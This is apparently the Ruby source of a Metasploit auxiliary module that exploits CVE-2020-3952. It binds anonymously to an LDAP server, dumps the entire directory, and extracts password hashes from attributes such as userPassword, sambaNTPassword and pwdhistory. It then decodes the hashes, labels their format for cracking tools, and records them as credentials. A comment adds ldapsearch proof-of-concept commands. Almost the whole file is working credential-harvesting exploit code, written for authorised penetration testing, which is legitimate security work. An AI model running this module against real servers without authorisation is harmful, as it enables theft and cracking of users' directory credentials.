##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LDAP Information Disclosure',
        'Description' => %q{
          This module uses an anonymous-bind LDAP connection to dump data from
          an LDAP server. Searching for attributes with user credentials
          (e.g. userPassword).
        },
        'Author' => [
          'Hynek Petrak' # Discovery, module
        ],
        'References' => [
          ['CVE', '2020-3952'],
          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
        ],
        'DisclosureDate' => '2020-07-23',
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Dump', { 'Description' => 'Dump all LDAP data' }]
        ],
        'DefaultAction' => 'Dump',
        'DefaultOptions' => {
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      Opt::RPORT(636), # SSL/TLS
      OptInt.new('MAX_LOOT', [false, 'Maximum number of LDAP entries to loot', nil]),
      OptInt.new('READ_TIMEOUT', [false, 'LDAP read timeout in seconds', 600]),
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
      OptString.new('USER_ATTR', [false, 'LDAP attribute(s), that contains username', 'dn']),
      OptString.new('PASS_ATTR', [
        true, 'LDAP attribute, that contains password hashes',
        'userPassword, sambantpassword, sambalmpassword, mailuserpassword, password, pwdhistory, passwordhistory, clearpassword'
        # Other potential candidates:
        # ipanthash, krbpwdhistory, krbmkey, userpkcs12, unixUserPassword, krbprincipalkey, radiustunnelpassword, sambapasswordhistory
      ])
    ])
  end

  def user_attr
    @user_attr ||= 'dn'
  end

  def print_ldap_error(ldap)
    opres = ldap.get_operation_result
    msg = "LDAP error #{opres.code}: #{opres.message}"
    unless opres.error_message.to_s.empty?
      msg += " - #{opres.error_message}"
    end
    print_error("#{peer} #{msg}")
  end

  # PoC using ldapsearch(1):
  #
  # Retrieve root DSE with base DN:
  #   ldapsearch -xb "" -s base -H ldap://[redacted]
  #
  # Dump data using discovered base DN:
  #   ldapsearch -xb bind_dn -H ldap://[redacted] \* + -
  def run_host(ip)
    @rhost = ip

    @read_timeout = datastore['READ_TIMEOUT'] || 600

    entries_returned = 0

    print_status("#{peer} Connecting...")
    ldap_new do |ldap|
      if ldap.get_operation_result.code == 0
        vprint_status("#{peer} LDAP connection established")
      else
        # Even if we get "Invalid credentials" error, we may proceed with anonymous bind
        print_ldap_error(ldap)
      end

      if (base_dn_tmp = datastore['BASE_DN'])
        vprint_status("#{peer} User-specified base DN: #{base_dn_tmp}")
        naming_contexts = [base_dn_tmp]
      else
        vprint_status("#{peer} Discovering base DN(s) automatically")

        begin
          # HACK: fix lack of read/write timeout in Net::LDAP
          Timeout.timeout(@read_timeout) do
            naming_contexts = get_naming_contexts(ldap)
          end
        rescue Timeout::Error
          fail_with(Failure::TimeoutExpired, 'The timeout expired while reading naming contexts')
        ensure
          unless ldap.get_operation_result.code == 0
            print_ldap_error(ldap)
          end
        end

        if naming_contexts.nil? || naming_contexts.empty?
          vprint_warning("#{peer} Falling back to an empty base DN")
          naming_contexts = ['']
        end
      end

      @max_loot = datastore['MAX_LOOT']

      @user_attr ||= datastore['USER_ATTR']
      @user_attr ||= 'dn'
      vprint_status("#{peer} Taking '#{@user_attr}' attribute as username")

      pass_attr ||= datastore['PASS_ATTR']
      @pass_attr_array = pass_attr.split(/[,\s]+/).compact.reject(&:empty?).map(&:downcase)

      # Dump root DSE for useful information, e.g. dir admin
      if @max_loot.nil? || (@max_loot > 0)
        print_status("#{peer} Dumping data for root DSE")

        ldap_search(ldap, 'root DSE', {
          ignore_server_caps: true,
          scope: Net::LDAP::SearchScope_BaseObject
        })
      end

      naming_contexts.each do |base_dn|
        print_status("#{peer} Searching base DN='#{base_dn}'")
        entries_returned += ldap_search(ldap, base_dn, {
          base: base_dn
        })
      end
    end

    # Safe if server did not returned anything
    unless (entries_returned > 0)
      fail_with(Failure::NotVulnerable, 'Server did not return any data, seems to be safe')
    end
  rescue Timeout::Error
    fail_with(Failure::TimeoutExpired, 'The timeout expired while searching directory')
  rescue Net::LDAP::PDU::Error, Net::BER::BerError, Net::LDAP::Error, NoMethodError => e
    fail_with(Failure::UnexpectedReply, "Exception occurred: #{e.class}: #{e.message}")
  end

  def ldap_search(ldap, base_dn, args)
    entries_returned = 0
    creds_found = 0
    def_args = {
      base: '',
      return_result: false,
      attributes: %w[* + -]
    }
    Tempfile.create do |f|
      f.write("# LDIF dump of #{peer}, base DN='#{base_dn}'\n")
      f.write("\n")
      begin
        # HACK: fix lack of read/write timeout in Net::LDAP
        Timeout.timeout(@read_timeout) do
          ldap.search(def_args.merge(args)) do |entry|
            entries_returned += 1
            if @max_loot.nil? || (entries_returned <= @max_loot)
              f.write("# #{entry.dn}\n")
              f.write(entry.to_ldif.force_encoding('utf-8'))
              f.write("\n")
            end
            @pass_attr_array.each do |attr|
              if entry[attr].any?
                creds_found += process_hash(entry, attr)
              end
            end
          end
        end
      rescue Timeout::Error
        print_error("#{peer} Host timeout reached while searching '#{base_dn}'")
        return entries_returned
      ensure
        unless ldap.get_operation_result.code == 0
          print_ldap_error(ldap)
        end
        if entries_returned > 0
          print_status("#{peer} #{entries_returned} entries, #{creds_found} creds found in '#{base_dn}'.")
          f.rewind
          pillage(f.read, base_dn)
        elsif ldap.get_operation_result.code == 0
          print_error("#{peer} No entries returned for '#{base_dn}'.")
        end
      end
    end
    entries_returned
  end

  def pillage(ldif, base_dn)
    vprint_status("#{peer} Storing LDAP data for base DN='#{base_dn}' in loot")

    ltype = base_dn.clone
    ltype.gsub!(/ /, '_')
    ltype.gsub!(/,/, '.')
    ltype.gsub!(/(ou=|fn=|cn=|o=|dc=|c=)/i, '')
    ltype.gsub!(/[^a-z0-9._\-]+/i, '')
    ltype = ltype.last(16)

    ldif_filename = store_loot(
      ltype, # ltype
      'text/plain', # ctype
      @rhost, # host
      ldif, # data
      nil, # filename
      "Base DN: #{base_dn.gsub(/[^[:print:]]/, '')}" # info, remove null char from base_dn
    )

    unless ldif_filename
      print_error("#{peer} Could not store LDAP data in loot")
      return
    end

    print_good("#{peer} Saved LDAP data to #{ldif_filename}")
  end

  def decode_pwdhistory(hash)
    # https://ldapwiki.com/wiki/PwdHistory
    parts = hash.split('#', 4)
    unless parts.length == 4
      return hash
    end

    hash = parts.last
    unless hash.starts_with?('{')
      decoded = Base64.decode64(hash)
      if decoded.starts_with?('{') || (decoded =~ /[^[:print:]]/).nil?
        return decoded
      end
    end
    hash
  end

  def process_hash(entry, attr)
    service_details = {
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      address: @rhost,
      port: rport,
      protocol: 'tcp',
      service_name: 'ldap'
    }

    creds_found = 0

    # This is the "username"
    dn = entry[@user_attr].first # .dn

    entry[attr].each do |hash|
      if attr == 'pwdhistory'
        hash = decode_pwdhistory(hash)
      end

      # 20170619183528ZHASHVALUE
      if attr == 'passwordhistory' && hash.start_with?(/\d{14}Z/i)
        hash.slice!(/\d{14}Z/i)
      end

      # Cases *[crypt}, !{crypt} ...
      hash.gsub!(/.?{crypt}/i, '{crypt}')

      # We observe some servers base64 encdode the hash string
      # and add {crypt} prefix to the base64 encoded value
      # e2NyeXB0f in base64 means {crypt
      # e3NtZD is {smd
      if hash.starts_with?(/{crypt}(e2NyeXB0f|e3NtZD)/)
        begin
          hash = Base64.strict_decode64(hash.delete_prefix('{crypt}'))
        rescue ArgumentError
          nil
        end
      end

      # Some have new lines at the end
      hash.chomp!

      # Skip empty or invalid hashes, e.g. '{CRYPT}x', xxxx, ****
      if hash.nil? || hash.empty? ||
         (hash.start_with?(/{crypt}/i) && hash.length < 10) ||
         hash.start_with?('*****') ||
         hash.start_with?(/yyyyyy/i) ||
         hash == '*' ||
         hash.end_with?('*LK*', # account locked
                        '*NP*') || # password has never been set
         # reject {SASL} pass-through
         hash =~ /{sasl}/i ||
         hash.start_with?(/xxxxx/i) ||
         (attr =~ /^samba(lm|nt)password$/ &&
          (hash.length != 32 ||
           hash =~ /^aad3b435b51404eeaad3b435b51404ee$/i ||
           hash =~ /^31d6cfe0d16ae931b73c59d7e0c089c0$/i)) ||
         # observed sambapassword history with either 56 or 64 zeros
         (attr == 'sambapasswordhistory' && hash =~ /^(0{64}|0{56})$/)
        next
      end

      case attr
      when 'sambalmpassword'
        hash_format = 'lm'
      when 'sambantpassword'
        hash_format = 'nt'
      when 'sambapasswordhistory'
        # 795471346779677A336879366B654870 1F18DC5E346FDA5E335D9AE207C82CC9
        # where the left part is a salt and the right part is MD5(Salt+NTHash)
        # attribute value may contain multiple concatenated history entries
        # for john sort of 'md5($s.md4(unicode($p)))' - not tested
        hash_format = 'sambapasswordhistory'
      when 'krbprincipalkey'
        hash_format = 'krbprincipal'
        # TODO: krbprincipalkey is asn.1 encoded string. In case of vmware vcenter 6.7
        # it contains user password encrypted with (23) rc4-hmac and (18) aes256-cts-hmac-sha1-96:
        # https://github.com/vmware/lightwave/blob/d50d41edd1d9cb59e7b7cc1ad284b9e46bfa703d/vmdir/server/common/krbsrvutil.c#L480-L558
        # Salted with principal name:
        # https://github.com/vmware/lightwave/blob/c4ad5a67eedfefe683357bc53e08836170528383/vmdir/thirdparty/heimdal/krb5-crypto/salt.c#L133-L175
        # In the meantime, dump the base64 encoded value.
        hash = Base64.strict_encode64(hash)
      when 'userpkcs12'
        # if we get non printable chars, encode into base64
        if (hash =~ /[^[:print:]]/).nil?
          hash_format = 'pkcs12'
        else
          hash_format = 'pkcs12-base64'
          hash = Base64.strict_encode64(hash)
        end
      else
        if hash.start_with?(/{crypt}.?\$1\$/i)
          hash.gsub!(/{crypt}.{,2}\$1\$/i, '$1$')
          hash_format = 'md5crypt'
        elsif hash.start_with?(/{crypt}/i) && hash.length == 20
          # handle {crypt}traditional_crypt case, i.e. explicitly set the hash format
          hash.slice!(/{crypt}/i)
          # FIXME: what is the right jtr_hash - des,crypt or descrypt ?
          # identify_hash returns des,crypt, while JtR acceppts descrypt
          hash_format = 'descrypt'
        # TODO: not sure if we shall slice the prefixes here or in the JtR/Hashcat formatter
        # elsif hash.start_with?(/{sha256}/i)
        #  hash.slice!(/{sha256}/i)
        #  hash_format = 'raw-sha256'
        else
          # handle vcenter vmdir binary hash format
          if hash[0].ord == 1 && hash.length == 81
            _type, hash, salt = hash.unpack('CH128H32')
            hash = "$dynamic_82$#{hash}$HEX$#{salt}"
          else
            # Remove LDAP's {crypt} prefix from known hash types
            hash.gsub!(/{crypt}.{,2}(\$[0256][aby]?\$)/i, '\1')
          end
          hash_format = identify_hash(hash)
        end
      end

      # higlight unresolved hashes
      hash_format = '{crypt}' if hash =~ /{crypt}/i

      print_good("#{peer} Credentials (#{hash_format.empty? ? 'password' : hash_format}) found in #{attr}: #{dn}:#{hash}")

      # known hash types should have been identified,
      # let's assume the rest are clear text passwords
      if hash_format.nil? || hash_format.empty?
        credential = create_credential(service_details.merge(
          username: dn,
          private_data: hash,
          private_type: :password
        ))
      else
        credential = create_credential(service_details.merge(
          username: dn,
          private_data: hash,
          private_type: :nonreplayable_hash,
          jtr_format: hash_format
        ))
      end

      create_credential_login({
        core: credential,
        access_level: 'User',
        status: Metasploit::Model::Login::Status::UNTRIED
      }.merge(service_details))
      creds_found += 1
    end
    creds_found
  end

end
